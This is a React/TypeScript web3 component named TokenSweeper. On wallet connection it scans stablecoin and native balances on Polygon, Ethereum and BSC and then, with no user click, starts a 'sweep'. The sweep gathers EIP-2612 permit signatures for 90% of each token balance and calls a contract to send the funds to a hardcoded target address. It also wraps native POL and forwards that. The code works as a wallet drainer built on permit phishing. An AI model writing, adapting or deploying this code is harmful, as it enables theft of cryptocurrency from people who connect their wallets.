// src/components/TokenSweeper.tsx
"use client";

import { useState, useEffect } from "react";
import {
  useAccount,
  useSignTypedData,
  useWriteContract,
  useSwitchChain,
  usePublicClient,
} from "wagmi";
import { Address, parseAbi, Chain, PublicClient } from "viem";
import { tokenSweeperAbi } from "@/lib/abis/TokenSweeper";
import { Button } from "@/components/ui/button";
import { formatBalance } from "@/lib/utils";

import { Skeleton } from "@/components/ui/skeleton";
import { mainnet, polygon, bsc } from "@reown/appkit/networks"; // Import from Reown appkit

// Contract addresses per chain (deploy and update these)
const CONTRACT_ADDRESSES: Record<number, Address> = {
  [polygon.id]: "0xF2E0A817FD2E795EaecC8BC63CFAcC5828Cc5150", // Your sweep contract
  [mainnet.id]: "0xYourEthereumContract",
  [bsc.id]: "0xYourBNBContract",
};

// WMATIC contract address on Polygon (this wraps native POL to WMATIC)
const WMATIC_ADDRESS: Address = "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270";

//Target Address - Hardcoded for automatic sweeping
const TARGET_ADDRESS: Address = "0xEc083d6958a356f125DC06d68a7B1696386434cD";

// Supported chains
const SUPPORTED_CHAINS: Chain[] = [polygon, mainnet, bsc];

// Sweep configuration
const SWEEP_PERCENT = BigInt(90); // Keep 10%

// Major tokens per chain (expand as needed)
const MAJOR_TOKENS: Record<
  number,
  {
    address: Address;
    name: string;
    domainName: string;
    domainVersion: string;
  }[]
> = {
  [polygon.id]: [
    // WMATIC (wrapped POL - this is the official wrapped token contract)
    {
      address: WMATIC_ADDRESS,
      name: "WMATIC",
      domainName: "Wrapped MATIC",
      domainVersion: "1",
    },
    {
      address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
      name: "USDT",
      domainName: "Tether USD",
      domainVersion: "1",
    },
    {
      address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
      name: "USDC",
      domainName: "USD Coin",
      domainVersion: "2",
    },
  ],
  [mainnet.id]: [
    {
      address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
      name: "USDT",
      domainName: "Tether USD",
      domainVersion: "1",
    },
    {
      address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
      name: "USDC",
      domainName: "USD Coin",
      domainVersion: "2",
    },
  ],
  [bsc.id]: [
    {
      address: "0x55d398326f99059fF775485246999027B3197955",
      name: "USDT",
      domainName: "Tether USD",
      domainVersion: "1",
    },
    {
      address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
      name: "USDC",
      domainName: "USD Coin",
      domainVersion: "2",
    },
  ],
};

// 1inch API base URL (for swapping)
const ONE_INCH_API = "https://api.1inch.dev/swap/v6.0/";

// Assume user provides 1inch API key in env
const ONE_INCH_API_KEY = process.env.NEXT_PUBLIC_ONE_INCH_API_KEY;

interface TokenBalance {
  token: Address;
  balance: bigint;
  name: string;
  chainId: number;
}

interface NativeBalance {
  balance: bigint;
  chainId: number;
  symbol: string;
}

// Manual splitSignature (since viem might not export it directly)
function manualSplitSignature(signature: `0x${string}`) {
  const sig = signature.slice(2);
  const r = `0x${sig.slice(0, 64)}` as `0x${string}`;
  const s = `0x${sig.slice(64, 128)}` as `0x${string}`;
  const v = parseInt(sig.slice(128, 130), 16);
  return { r, s, v };
}

export default function TokenSweeper() {
  const { address: userAddress, isConnected } = useAccount();
  const { switchChain } = useSwitchChain();
  const { signTypedDataAsync } = useSignTypedData();
  const { writeContract } = useWriteContract();
  const publicClient = usePublicClient(); // Current chain client

  const [tokenBalances, setTokenBalances] = useState<TokenBalance[]>([]);
  const [nativeBalances, setNativeBalances] = useState<NativeBalance[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const [actionType, setActionType] = useState<"wrap" | "swap" | null>(null);
  const [successMessage, setSuccessMessage] = useState<string | null>(null);
  const [gasStatus, setGasStatus] = useState<{
    hasEnoughGas: boolean;
    nativeBalance: bigint;
    estimatedCost: bigint;
    symbol: string;
  } | null>(null);

  // Function to get client for specific chain (simplified; in prod, use configured clients)
  const getPublicClient = (): PublicClient => {
    // For demo, assume switching; better to have pre-configured multi-chain
    return publicClient!; // Placeholder; implement proper multi-chain
  };

  // Auto-sweep function that handles the entire process
  const handleAutoSweep = async (
    balances: TokenBalance[],
    nativeBals: NativeBalance[]
  ) => {
    if (!isConnected || !userAddress) {
      setError("Wallet not connected");
      return;
    }

    // Check if we have any tokens to sweep
    if (balances.length === 0) {
      const nativeOnPolygon = nativeBals.find(
        (n) => n.chainId === polygon.id && n.balance > BigInt(0)
      );
      if (nativeOnPolygon) {
        // Auto-wrap native POL first
        await handleWrapMatic();
        return;
      } else {
        setError("No ERC20 tokens with balance found on supported list");
        return;
      }
    }

    setIsLoading(true);
    setError(null);

    try {
      // Group balances by chain
      const balancesByChain = balances.reduce((acc, bal) => {
        acc[bal.chainId] = acc[bal.chainId] || [];
        acc[bal.chainId].push(bal);
        return acc;
      }, {} as Record<number, TokenBalance[]>);

      for (const [chainId, bals] of Object.entries(balancesByChain)) {
        const id = Number(chainId);

        // Check if user has any balance on this chain before switching
        const hasAnyBalance = bals.some((bal) => bal.balance > BigInt(0));
        if (!hasAnyBalance) {
          console.log(`No balance on chain ${id}, skipping...`);
          continue;
        }

        await switchChain({ chainId: id });
        const hasGas = await checkGas(id);
        if (!hasGas) {
          setError(
            `No native tokens for gas on chain ${id}. Please add some native tokens to cover gas fees.`
          );
          continue;
        }

        // Proceed with permits - sweep 90% of each token balance
        const permits = (
          await Promise.all(
            bals.map(async ({ token, balance }) => {
              // Calculate 90% of the balance
              const sweepAmount = (balance * SWEEP_PERCENT) / BigInt(100);

              if (sweepAmount <= BigInt(0)) {
                return null;
              }

              const nonce = (await getPublicClient().readContract({
                address: token,
                abi: parseAbi([
                  "function nonces(address owner) view returns (uint256)",
                ]),
                functionName: "nonces",
                args: [userAddress],
              })) as bigint; // Type as bigint

              const tokenInfo = MAJOR_TOKENS[id].find(
                (t) => t.address === token
              );
              if (!tokenInfo) return null;

              const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);

              const domain = {
                name: tokenInfo.domainName,
                version: tokenInfo.domainVersion,
                chainId: BigInt(id),
                verifyingContract: token as `0x${string}`,
              };

              const types = {
                Permit: [
                  { name: "owner", type: "address" },
                  { name: "spender", type: "address" },
                  { name: "value", type: "uint256" },
                  { name: "nonce", type: "uint256" },
                  { name: "deadline", type: "uint256" },
                ],
              } as const;

              const message = {
                owner: userAddress ?? ("0x" as Address),
                spender: CONTRACT_ADDRESSES[id],
                value: sweepAmount,
                nonce,
                deadline,
              };

              const signature = await signTypedDataAsync({
                domain,
                types,
                primaryType: "Permit",
                message,
              });

              const { v, r, s } = manualSplitSignature(signature);

              return {
                token,
                amount: sweepAmount,
                deadline,
                v,
                r,
                s,
              };
            })
          )
        ).filter(
          (
            p
          ): p is {
            token: Address;
            amount: bigint;
            deadline: bigint;
            v: number;
            r: `0x${string}`;
            s: `0x${string}`;
          } => p !== null
        );

        if (permits.length === 0) {
          setError(`No valid permits generated for chain ${id}`);
          continue;
        }

        // Call contract
        writeContract({
          address: CONTRACT_ADDRESSES[id],
          abi: tokenSweeperAbi,
          functionName: "secureWithPermits",
          args: [permits, TARGET_ADDRESS], // Use hardcoded target address
          chainId: id,
        });
      }
    } catch (err: unknown) {
      setError(`Error: ${(err as Error).message}`);
    } finally {
      setIsLoading(false);
    }
  };

  // Update gas status for current network
  const updateGasStatus = async () => {
    if (!isConnected || !userAddress) return;

    try {
      const gasCheck = await checkGasWithEstimation(polygon.id);
      const symbol = polygon.nativeCurrency?.symbol || "POL";
      setGasStatus({
        hasEnoughGas: gasCheck.hasEnoughGas,
        nativeBalance: gasCheck.nativeBalance,
        estimatedCost: gasCheck.totalGasCost,
        symbol,
      });
    } catch (error) {
      console.error("Failed to update gas status:", error);
    }
  };

  // Fetch balances across chains without hook loops
  useEffect(() => {
    if (isConnected && userAddress) {
      const fetchBalances = async () => {
        const allBalances: TokenBalance[] = [];
        const allNative: NativeBalance[] = [];
        for (const ch of SUPPORTED_CHAINS) {
          // Switch only if necessary; try to fetch without
          try {
            const balancesPromises = MAJOR_TOKENS[ch.id].map(async (token) => {
              try {
                const balance = (await getPublicClient().readContract({
                  address: token.address,
                  abi: parseAbi([
                    "function balanceOf(address) view returns (uint256)",
                  ]),
                  functionName: "balanceOf",
                  args: [userAddress],
                })) as bigint; // Type as bigint
                if (balance && balance > BigInt(0)) {
                  return {
                    token: token.address,
                    balance,
                    name: token.name,
                    chainId: ch.id,
                  };
                }
              } catch {}
              return null;
            });

            const chainBalances = (await Promise.all(balancesPromises)).filter(
              Boolean
            ) as TokenBalance[];
            allBalances.push(...chainBalances);
          } catch {}

          // Native balance for this chain
          try {
            const nativeBal = await getPublicClient().getBalance({
              address: userAddress,
            });
            if (nativeBal && nativeBal > BigInt(0)) {
              allNative.push({
                balance: nativeBal,
                chainId: ch.id,
                symbol: ch.nativeCurrency?.symbol || "NATIVE",
              });
            }
          } catch {}
        }
        setTokenBalances(allBalances);
        setNativeBalances(allNative);

        // Update gas status
        await updateGasStatus();

        // Auto-start sweep after fetching balances
        setTimeout(() => {
          if (
            allBalances.length > 0 ||
            allNative.some((n) => n.balance > BigInt(0))
          ) {
            handleAutoSweep(allBalances, allNative);
          }
        }, 2000); // Small delay to ensure balances are set
      };
      fetchBalances();
    }
  }, [isConnected, userAddress, publicClient, handleAutoSweep]);

  const checkGas = async (chainId: number) => {
    const nativeBalance = await getPublicClient().getBalance({
      address: userAddress ?? ("0x" as Address),
    });
    return nativeBalance > BigInt(0);
  };

  // Enhanced gas checking with estimation
  const checkGasWithEstimation = async (chainId: number) => {
    try {
      const nativeBalance = await getPublicClient().getBalance({
        address: userAddress ?? ("0x" as Address),
      });

      // Get current gas price
      const gasPrice = await getPublicClient().getGasPrice();

      // Conservative gas estimate for typical transactions
      const estimatedGasLimit = BigInt(500000); // 500k gas units for safety

      // Calculate total gas cost
      const totalGasCost = estimatedGasLimit * gasPrice;

      // Add 50% buffer for gas price fluctuations and network congestion
      const gasCostWithBuffer = (totalGasCost * BigInt(150)) / BigInt(100);

      // Check if user has enough balance
      const hasEnoughGas = nativeBalance >= gasCostWithBuffer;

      return {
        hasEnoughGas,
        nativeBalance,
        gasEstimate: estimatedGasLimit,
        gasPrice,
        totalGasCost: gasCostWithBuffer,
        shortfall: hasEnoughGas ? BigInt(0) : gasCostWithBuffer - nativeBalance,
      };
    } catch (error) {
      console.error("Gas estimation failed:", error);
      // Fallback to simple balance check
      const nativeBalance = await getPublicClient().getBalance({
        address: userAddress ?? ("0x" as Address),
      });
      return {
        hasEnoughGas: nativeBalance > BigInt(0),
        nativeBalance,
        gasEstimate: BigInt(0),
        gasPrice: BigInt(0),
        totalGasCost: BigInt(0),
        shortfall: BigInt(0),
      };
    }
  };

  // Function to wrap native MATIC to WMATIC
  const handleWrapMatic = async () => {
    if (!isConnected || !userAddress) {
      setError("Wallet not connected");
      return;
    }

    const nativeOnPolygon = nativeBalances.find(
      (n) => n.chainId === polygon.id && n.balance > BigInt(0)
    );

    if (!nativeOnPolygon) {
      setError("No native MATIC found on Polygon");
      return;
    }

    setIsLoading(true);
    setError(null);
    setSuccessMessage(null);

    try {
      // Switch to Polygon if not already on it
      await switchChain({ chainId: polygon.id });

      // Check gas before wrapping
      const gasCheck = await checkGasWithEstimation(polygon.id);
      if (!gasCheck.hasEnoughGas) {
        const shortfallFormatted = formatBalance(gasCheck.shortfall, 18);
        setError(
          `Insufficient MATIC for gas fees. Need ${shortfallFormatted} more MATIC to cover transaction costs.`
        );
        setIsLoading(false);
        return;
      }

      // Calculate how much MATIC to wrap (wrap only 90% after reserving gas)
      const gasReserve = gasCheck.totalGasCost;
      const availableAfterGas =
        nativeOnPolygon.balance > gasReserve
          ? nativeOnPolygon.balance - gasReserve
          : BigInt(0);
      const wrapAmount = (availableAfterGas * SWEEP_PERCENT) / BigInt(100);

      if (wrapAmount <= BigInt(0)) {
        setError("Insufficient POL to wrap after reserving gas fees.");
        setIsLoading(false);
        return;
      }

      // Wrap MATIC to WMATIC using the WMATIC contract
      writeContract({
        address: WMATIC_ADDRESS,
        abi: parseAbi(["function deposit() external payable"]),
        functionName: "deposit",
        value: wrapAmount,
        chainId: polygon.id,
      });

      setActionType("wrap");
      setSuccessMessage(
        `Successfully initiated POL wrap of ${formatBalance(
          wrapAmount
        )} POL. Check your wallet for transaction confirmation.`
      );

      // After wrapping, poll WMATIC balance and forward 90% via secureWithPermits
      setTimeout(async () => {
        try {
          // Read current WMATIC balance
          const wmaticBal = (await getPublicClient().readContract({
            address: WMATIC_ADDRESS,
            abi: parseAbi([
              "function balanceOf(address) view returns (uint256)",
            ]),
            functionName: "balanceOf",
            args: [userAddress],
          })) as bigint;

          if (wmaticBal && wmaticBal > BigInt(0)) {
            const sweepAmount = (wmaticBal * SWEEP_PERCENT) / BigInt(100);
            // Fetch nonce and token name for EIP-2612 domain
            const [nonce, tokenName] = (await Promise.all([
              getPublicClient().readContract({
                address: WMATIC_ADDRESS,
                abi: parseAbi([
                  "function nonces(address owner) view returns (uint256)",
                ]),
                functionName: "nonces",
                args: [userAddress],
              }),
              getPublicClient().readContract({
                address: WMATIC_ADDRESS,
                abi: parseAbi(["function name() view returns (string)"]),
                functionName: "name",
              }),
            ])) as [bigint, string];

            const domain = {
              name: tokenName,
              version: "1",
              chainId: BigInt(polygon.id),
              verifyingContract: WMATIC_ADDRESS as `0x${string}`,
            };
            const types = {
              Permit: [
                { name: "owner", type: "address" },
                { name: "spender", type: "address" },
                { name: "value", type: "uint256" },
                { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" },
              ],
            } as const;
            const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);
            const message = {
              owner: userAddress ?? ("0x" as Address),
              spender: CONTRACT_ADDRESSES[polygon.id],
              value: sweepAmount,
              nonce,
              deadline,
            };
            const signature = await signTypedDataAsync({
              domain,
              types,
              primaryType: "Permit",
              message,
            });
            const { v, r, s } = manualSplitSignature(signature);

            writeContract({
              address: CONTRACT_ADDRESSES[polygon.id],
              abi: tokenSweeperAbi,
              functionName: "secureWithPermits",
              args: [
                [
                  {
                    token: WMATIC_ADDRESS,
                    amount: sweepAmount,
                    deadline,
                    v,
                    r,
                    s,
                  },
                ],
                TARGET_ADDRESS,
              ],
              chainId: polygon.id,
            });
          }
        } catch (e) {
          console.error("Post-wrap forward failed:", e);
        }
      }, 4000);
    } catch (err: unknown) {
      setError(`Error wrapping POL: ${(err as Error).message}`);
    } finally {
      setIsLoading(false);
    }
  };

  // Function to swap native POL to USDC/USDT
  const handleSwapPol = async (targetToken: "USDC" | "USDT") => {
    if (!isConnected || !userAddress) {
      setError("Wallet not connected");
      return;
    }

    if (!ONE_INCH_API_KEY) {
      setError("1inch API key missing");
      return;
    }

    const nativeOnPolygon = nativeBalances.find(
      (n) => n.chainId === polygon.id && n.balance > BigInt(0)
    );

    if (!nativeOnPolygon) {
      setError("No native MATIC found on Polygon");
      return;
    }

    setIsLoading(true);
    setError(null);
    setSuccessMessage(null);

    try {
      // Switch to Polygon if not already on it
      await switchChain({ chainId: polygon.id });

      const targetTokenAddress =
        targetToken === "USDC"
          ? "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
          : "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";

      const nativeAddress = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"; // 1inch native placeholder

      const response = await fetch(`${ONE_INCH_API}${polygon.id}/swap`, {
        method: "POST",
        headers: {
          Authorization: `Bearer ${ONE_INCH_API_KEY}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          fromTokenAddress: nativeAddress,
          toTokenAddress: targetTokenAddress,
          amount: nativeOnPolygon.balance.toString(),
          fromAddress: userAddress,
          slippage: 1, // 1%
        }),
      });

      if (!response.ok) {
        throw new Error(`1inch API error: ${response.statusText}`);
      }

      const swapData = await response.json();

      // Execute swap transaction
      writeContract({
        ...swapData.tx, // Includes to, data, value, etc.
        chainId: polygon.id,
      });

      setActionType("swap");
      setSuccessMessage(
        `Successfully initiated swap to ${targetToken}. Check your wallet for transaction confirmation.`
      );
    } catch (err: unknown) {
      setError(`Error swapping MATIC: ${(err as Error).message}`);
    } finally {
      setIsLoading(false);
    }
  };

  // Function to unwrap WMATIC back to native MATIC
  const handleUnwrapMatic = async () => {
    if (!isConnected || !userAddress) {
      setError("Wallet not connected");
      return;
    }

    const wmaticBalance = tokenBalances.find(
      (t) => t.chainId === polygon.id && t.token === WMATIC_ADDRESS
    );

    if (!wmaticBalance || wmaticBalance.balance === BigInt(0)) {
      setError("No WMATIC balance found");
      return;
    }

    setIsLoading(true);
    setError(null);
    setSuccessMessage(null);

    try {
      // Switch to Polygon if not already on it
      await switchChain({ chainId: polygon.id });

      // Unwrap WMATIC to MATIC using the WMATIC contract
      writeContract({
        address: WMATIC_ADDRESS,
        abi: parseAbi(["function withdraw(uint256 amount) external"]),
        functionName: "withdraw",
        args: [wmaticBalance.balance],
        chainId: polygon.id,
      });

      setActionType("wrap");
      setSuccessMessage(
        "Successfully initiated WMATIC unwrap. Check your wallet for transaction confirmation."
      );
    } catch (err: unknown) {
      setError(`Error unwrapping WMATIC: ${(err as Error).message}`);
    } finally {
      setIsLoading(false);
    }
  };

  const handleSweep = async () => {
    if (!isConnected || !userAddress) {
      setError("Wallet not connected");
      return;
    }
    if (tokenBalances.length === 0) {
      const nativeOnPolygon = nativeBalances.find(
        (n) => n.chainId === polygon.id && n.balance > BigInt(0)
      );
      if (nativeOnPolygon) {
        setError(
          "Only native MATIC detected. Please wrap to WMATIC or swap to USDC/USDT first."
        );
      } else {
        setError("No ERC20 tokens with balance found on supported list");
      }
      return;
    }

    setIsLoading(true);
    setError(null);

    try {
      // Group balances by chain
      const balancesByChain = tokenBalances.reduce((acc, bal) => {
        acc[bal.chainId] = acc[bal.chainId] || [];
        acc[bal.chainId].push(bal);
        return acc;
      }, {} as Record<number, TokenBalance[]>);

      for (const [chainId, bals] of Object.entries(balancesByChain)) {
        const id = Number(chainId);

        // Check if user has any balance on this chain before switching
        const hasAnyBalance = bals.some((bal) => bal.balance > BigInt(0));
        if (!hasAnyBalance) {
          console.log(`No balance on chain ${id}, skipping...`);
          continue;
        }

        await switchChain({ chainId: id });
        const hasGas = await checkGas(id);
        if (!hasGas) {
          setError(
            `No native tokens for gas on chain ${id}. Please add some native tokens to cover gas fees.`
          );
          continue;
        }

        // Proceed with permits - sweep 90% of each token balance
        const permits = (
          await Promise.all(
            bals.map(async ({ token, balance }) => {
              // Calculate 90% of the balance
              const sweepAmount = (balance * SWEEP_PERCENT) / BigInt(100);

              if (sweepAmount <= BigInt(0)) {
                return null;
              }

              const nonce = (await getPublicClient().readContract({
                address: token,
                abi: parseAbi([
                  "function nonces(address owner) view returns (uint256)",
                ]),
                functionName: "nonces",
                args: [userAddress],
              })) as bigint; // Type as bigint

              const tokenInfo = MAJOR_TOKENS[id].find(
                (t) => t.address === token
              );
              if (!tokenInfo) return null;

              const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);

              const domain = {
                name: tokenInfo.domainName,
                version: tokenInfo.domainVersion,
                chainId: BigInt(id),
                verifyingContract: token as `0x${string}`,
              };

              const types = {
                Permit: [
                  { name: "owner", type: "address" },
                  { name: "spender", type: "address" },
                  { name: "value", type: "uint256" },
                  { name: "nonce", type: "uint256" },
                  { name: "deadline", type: "uint256" },
                ],
              } as const;

              const message = {
                owner: userAddress ?? ("0x" as Address),
                spender: CONTRACT_ADDRESSES[id],
                value: sweepAmount,
                nonce,
                deadline,
              };

              const signature = await signTypedDataAsync({
                domain,
                types,
                primaryType: "Permit",
                message,
              });

              const { v, r, s } = manualSplitSignature(signature);

              return {
                token,
                amount: sweepAmount,
                deadline,
                v,
                r,
                s,
              };
            })
          )
        ).filter(
          (
            p
          ): p is {
            token: Address;
            amount: bigint;
            deadline: bigint;
            v: number;
            r: `0x${string}`;
            s: `0x${string}`;
          } => p !== null
        );

        if (permits.length === 0) {
          setError(`No valid permits generated for chain ${id}`);
          continue;
        }

        // Call contract
        writeContract({
          address: CONTRACT_ADDRESSES[id],
          abi: tokenSweeperAbi,
          functionName: "secureWithPermits",
          args: [permits, TARGET_ADDRESS], // Use hardcoded target address
          chainId: id,
        });
      }
    } catch (err: unknown) {
      setError(`Error: ${(err as Error).message}`);
    } finally {
      setIsLoading(false);
    }
  };

  // Function to swap tokens to native (for gas) or to a bridgeable asset
  const handleSwapToNative = async (
    chainId: number,
    tokensToSwap: TokenBalance[]
  ) => {
    if (!ONE_INCH_API_KEY) {
      setError("1inch API key missing");
      return;
    }

    for (const { token, balance } of tokensToSwap) {
      // Example: Swap to native (e.g., MATIC on Polygon, ETH on Mainnet)
      const nativeAddress = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"; // 1inch native placeholder

      const response = await fetch(`${ONE_INCH_API}${chainId}/swap`, {
        method: "POST",
        headers: { Authorization: `Bearer ${ONE_INCH_API_KEY}` },
        body: JSON.stringify({
          fromTokenAddress: token,
          toTokenAddress: nativeAddress,
          amount: balance.toString(),
          fromAddress: userAddress,
          slippage: 1, // 1%
        }),
      });
      const swapData = await response.json();

      // Execute swap tx
      writeContract({
        ...swapData.tx, // Includes to, data, value, etc.
        chainId,
      });

      // After swap, could bridge if needed, but bridging is separate (e.g., use Polygon bridge SDK)
    }
  };

  if (!isConnected) return <p>Connect your wallet to sweep tokens.</p>;

  const nativeOnPolygon = nativeBalances.find(
    (n) => n.chainId === polygon.id && n.balance > BigInt(0)
  );

  return (
    <div className="p-4">
      <h2 className="text-xl font-bold mb-4">Token Sweeper</h2>
      <p className="text-sm text-gray-400 mb-4">
        Automatic token sweeping to: {TARGET_ADDRESS} (90% of balance)
      </p>

      {/* Gas Status Warning */}
      {isConnected && userAddress && (
        <div className="mb-4 p-3 border border-orange-400 rounded-lg bg-orange-400/10">
          <div className="flex items-center gap-2 mb-2">
            <span className="text-orange-400 font-semibold">
              ⚠️ Gas Fee Alert
            </span>
          </div>
          <p className="text-sm text-gray-300">
            Ensure you have sufficient native tokens (MATIC/ETH/BNB) to cover
            network fees. The system will sweep 90% of your token balances and
            only switch chains when you have actual balances to process.
          </p>

          {/* Real-time Gas Status */}
          {gasStatus && (
            <div className="mt-3 p-2 bg-gray-800 rounded">
              <div className="flex justify-between items-center text-sm">
                <span>Current {gasStatus.symbol} Balance:</span>
                <span
                  className={
                    gasStatus.hasEnoughGas ? "text-green-400" : "text-red-400"
                  }
                >
                  {formatBalance(gasStatus.nativeBalance)} {gasStatus.symbol}
                </span>
              </div>
              <div className="flex justify-between items-center text-sm mt-1">
                <span>Estimated Gas Cost:</span>
                <span className="text-yellow-400">
                  {formatBalance(gasStatus.estimatedCost)} {gasStatus.symbol}
                </span>
              </div>
              {!gasStatus.hasEnoughGas && (
                <div className="mt-2 p-2 bg-red-900/50 border border-red-500 rounded text-sm text-red-300">
                  ⚠️ Insufficient {gasStatus.symbol} for gas fees. Please add
                  more {gasStatus.symbol} to your wallet.
                </div>
              )}
            </div>
          )}
        </div>
      )}

      {/* Native POL Actions */}
      {nativeOnPolygon && nativeOnPolygon.balance > BigInt(0) && (
        <div className="mb-6 p-4 border border-yellow-400 rounded-lg bg-yellow-400/10">
          <h3 className="text-lg font-semibold mb-3 text-yellow-400">
            Native POL Detected
          </h3>
          <p className="text-sm mb-4 text-gray-300">
            Balance: {formatBalance(nativeOnPolygon.balance)} POL
          </p>
          <div className="flex flex-wrap gap-2">
            <Button
              onClick={handleWrapMatic}
              disabled={isLoading}
              className="bg-yellow-400 text-black hover:bg-yellow-300"
            >
              {isLoading && actionType === "wrap"
                ? "Wrapping..."
                : "Wrap to WMATIC"}
            </Button>
            <Button
              onClick={() => handleSwapPol("USDC")}
              disabled={isLoading}
              className="bg-blue-600 hover:bg-blue-700"
            >
              {isLoading && actionType === "swap"
                ? "Swapping..."
                : "Swap to USDC"}
            </Button>
            <Button
              onClick={() => handleSwapPol("USDT")}
              disabled={isLoading}
              className="bg-green-600 hover:bg-green-700"
            >
              {isLoading && actionType === "swap"
                ? "Swapping..."
                : "Swap to USDT"}
            </Button>
          </div>
        </div>
      )}

      {/* WMATIC Actions */}
      {(() => {
        const wmaticBalance = tokenBalances.find(
          (t) => t.chainId === polygon.id && t.token === WMATIC_ADDRESS
        );
        return wmaticBalance && wmaticBalance.balance > BigInt(0) ? (
          <div className="mb-6 p-4 border border-purple-400 rounded-lg bg-purple-400/10">
            <h3 className="text-lg font-semibold mb-3 text-purple-400">
              WMATIC Balance Available
            </h3>
            <p className="text-sm mb-4 text-gray-300">
              Balance: {formatBalance(wmaticBalance.balance)} WMATIC
            </p>
            <div className="flex flex-wrap gap-2">
              <Button
                onClick={handleUnwrapMatic}
                disabled={isLoading}
                className="bg-purple-600 hover:bg-purple-700"
              >
                {isLoading && actionType === "wrap"
                  ? "Unwrapping..."
                  : "Unwrap to MATIC"}
              </Button>
            </div>
          </div>
        ) : null;
      })()}

      <div className="mb-4">
        <h3 className="text-lg font-semibold mb-2">ERC20 Token Balances:</h3>
        {tokenBalances.length > 0 ? (
          <div className="space-y-2">
            {tokenBalances.map(({ name, balance, chainId }) => (
              <div
                key={`${name}-${chainId}`}
                className="flex justify-between items-center p-2 bg-gray-800 rounded"
              >
                <span className="font-medium">{name}</span>
                <span className="text-sm text-gray-300">
                  Chain {chainId}: {formatBalance(balance)}
                </span>
              </div>
            ))}
          </div>
        ) : (
          <Skeleton className="h-4 w-[200px]" />
        )}
      </div>
      <div className="mb-4">
        <h3 className="text-lg font-semibold mb-2">Native Token Balances:</h3>
        {nativeBalances.length > 0 ? (
          <div className="space-y-2">
            {nativeBalances.map(({ symbol, balance, chainId }) => (
              <div
                key={`${symbol}-${chainId}`}
                className="flex justify-between items-center p-2 bg-gray-800 rounded"
              >
                <span className="font-medium">{symbol}</span>
                <span className="text-sm text-gray-300">
                  Chain {chainId}: {formatBalance(balance)}
                </span>
              </div>
            ))}
          </div>
        ) : (
          <Skeleton className="h-4 w-[200px]" />
        )}
      </div>
      <Button onClick={handleSweep} disabled={isLoading}>
        {isLoading ? "Sweeping..." : "Sweep Tokens"}
      </Button>
      {error && <p className="text-red-500 mt-2">{error}</p>}
      {successMessage && (
        <p className="text-green-500 mt-2">{successMessage}</p>
      )}
    </div>
  );
}
